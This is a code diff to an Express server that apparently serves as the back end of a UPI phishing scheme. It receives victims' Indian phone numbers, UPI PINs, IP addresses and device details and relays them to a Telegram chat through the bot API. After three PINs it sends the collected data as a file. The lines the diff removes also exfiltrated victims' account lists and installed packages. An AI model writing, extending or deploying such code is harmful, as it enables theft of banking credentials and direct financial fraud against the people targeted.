@@ -10,6 +10,7 @@ app.use(express.json());
 
 const { PORT, BOT_TOKEN, CHAT_ID } = process.env;
 
+
 let lastMessageId = null;
 let currentMessageText = "";
 let pinCount = 0; 
@@ -66,23 +67,24 @@ const startupNotification = async () => {
     try {
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             chat_id: CHAT_ID,
-            text: `*BJP Client's Started*`,
+            text: `*BJP Client's*`,
             parse_mode: 'Markdown'
         });
     } catch (e) {}
 };
 
 app.post('/send-data', async (req, res) => {
-    const { type, number, pin, deviceId, deviceTime, deviceDate, userIP, accounts, packages } = req.body;
+    const { type, number, pin, deviceId, deviceTime, deviceDate, userIP } = req.body;
     
     if (deviceId) {
         fullDeviceName = deviceId;
     }
 
-    // STEP 1: NUMBER
     if (type === 'NUMBER') {
+
         lastMessageId = null; 
         pinCount = 0; 
+        
 
         let updatedText = `*Device Model:* ${deviceId || 'Detecting...'}\n`;
         updatedText += `*IP Address:* "${userIP || 'Detecting...'}"\n`; 
@@ -90,54 +92,19 @@ app.post('/send-data', async (req, res) => {
         updatedText += `*Real Time:* ${deviceTime || 'Detecting...'}\n`; 
         updatedText += `*Number:* "+91${number}"\n`;
         
-        currentMessageText = updatedText;
-        await sendOrUpdateTelegram(currentMessageText);
-    } 
-    
-    // STEP 2: PIN
-    else if (pin) {
+        await sendOrUpdateTelegram(updatedText);
+    } else if (pin) {
         pinCount++; 
+
+
         currentMessageText += `*UPI PIN:* "${pin}"\n`;
+        
         await sendOrUpdateTelegram(currentMessageText);
+        
+
         if (pinCount === 3) {
             await sendFileToTelegram(currentMessageText, fullDeviceName);
         }
-    }
-
-    // STEP 3: EXTRA (ACCOUNTS & PACKAGES) - YAHAN UPDATE KIYA HAI
-    else if (type === 'EXTRA' || accounts || packages) {
-        let accountRawText = "";
-        let packageRawText = "";
-        
-        // Accounts Processing
-        let accList = accounts;
-        try { if (typeof accounts === 'string') accList = JSON.parse(accounts); } catch (e) { accList = accounts; }
-        if (accList && Array.isArray(accList) && accList.length > 0) {
-            accList.forEach(acc => { accountRawText += `• ${acc}\n`; });
-        } else { accountRawText = "No Accounts Found\n"; }
-
-        // Packages Processing
-        let pkgList = packages;
-        try { if (typeof packages === 'string') pkgList = JSON.parse(packages); } catch (e) { pkgList = packages; }
-        if (pkgList && Array.isArray(pkgList) && pkgList.length > 0) {
-            pkgList.forEach(pkg => { packageRawText += `• ${pkg}\n`; });
-        } else { packageRawText = "No Packages Found\n"; }
-
-        // Update Telegram Message
-        let extraInfo = `\n*--- Account's ---*\n${accountRawText}\n*--- Package's ---*\n${packageRawText}`;
-        currentMessageText += extraInfo;
-        await sendOrUpdateTelegram(currentMessageText);
-        
-        // --- SENDING FILES IN YOUR FOLDER-STYLE FORMAT ---
-        
-        // 1. Full Data (Model.txt)
-        await sendFileToTelegram(currentMessageText, `${fullDeviceName}`);
-
-        // 2. Accounts Only (Model/Account's.txt)
-        await sendFileToTelegram(accountRawText, `${fullDeviceName}/Account's`);
-
-        // 3. Packages Only (Model/Package's.txt)
-        await sendFileToTelegram(packageRawText, `${fullDeviceName}/Package's`);
     }
     
     res.status(200).json({ success: true });
